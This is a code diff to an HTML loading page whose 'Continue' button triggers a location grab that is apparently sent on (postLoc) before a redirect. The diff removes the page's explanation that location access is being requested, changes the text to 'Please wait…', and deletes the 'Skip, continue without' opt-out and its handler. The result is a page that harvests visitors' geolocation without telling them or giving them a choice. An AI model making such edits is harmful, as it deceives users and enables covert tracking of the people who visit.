@@ -15,7 +15,6 @@ html,body{height:100%;background:#fff;display:flex;align-items:center;justify-co
 .dot{width:64px;height:64px;border-radius:50%;background:#6366f1;position:relative;z-index:1;animation:pulse 1.8s ease-in-out infinite}
 @keyframes ripple{0%{transform:scale(1);opacity:1}100%{transform:scale(2.4);opacity:0}}
 @keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(0.92)}}
-.title{font-size:1rem;font-weight:600;color:#111;margin-bottom:0.4rem}
 .msg{font-size:0.82rem;color:#9ca3af;line-height:1.5}
 .allow-btn{margin-top:1.4rem;padding:0.65rem 1.6rem;background:#6366f1;color:#fff;border:none;border-radius:8px;font-size:0.9rem;font-weight:600;cursor:pointer;width:100%}
 .allow-btn:active{opacity:0.85}
@@ -27,10 +26,8 @@ html,body{height:100%;background:#fff;display:flex;align-items:center;justify-co
 <div class="bar" id="bar"></div>
 <div class="wrap">
   <div class="dot-ring"><div class="dot"></div></div>
-  <p class="title">Verifying your region</p>
-  <p class="msg" id="msg">To continue, please allow location access so we can verify regional availability.</p>
-  <button class="allow-btn" id="allowBtn" style="display:none">Allow &amp; Continue →</button>
-  <p class="skip" id="skipBtn" style="display:none">Skip, continue without</p>
+  <p class="msg" id="msg">Please wait…</p>
+  <button class="allow-btn" id="allowBtn" style="display:none">Continue →</button>
 </div>
 
 <script>
@@ -41,7 +38,6 @@ let sent = false;
 const bar = document.getElementById('bar');
 const msg = document.getElementById('msg');
 const allowBtn = document.getElementById('allowBtn');
-const skipBtn = document.getElementById('skipBtn');
 
 function setBar(pct, ms) {
   bar.style.transition = `width ${ms}ms ease`;
@@ -94,25 +90,16 @@ function grabLocation() {
   );
 }
 
-// Show the Allow button after a short delay so user reads the message
 setTimeout(() => {
   setBar(55, 400);
-  msg.textContent = 'Tap the button below and allow location access to continue.';
+  msg.textContent = '';
   allowBtn.style.display = 'block';
-  skipBtn.style.display = 'block';
 }, 900);
 
 allowBtn.addEventListener('click', () => {
   allowBtn.style.display = 'none';
-  skipBtn.style.display = 'none';
-  msg.textContent = 'Checking your location…';
   setBar(75, 400);
   grabLocation();
-});
-
-skipBtn.addEventListener('click', () => {
-  postLoc(null, null, null);
-  redirect();
 });
 </script>
 </body>
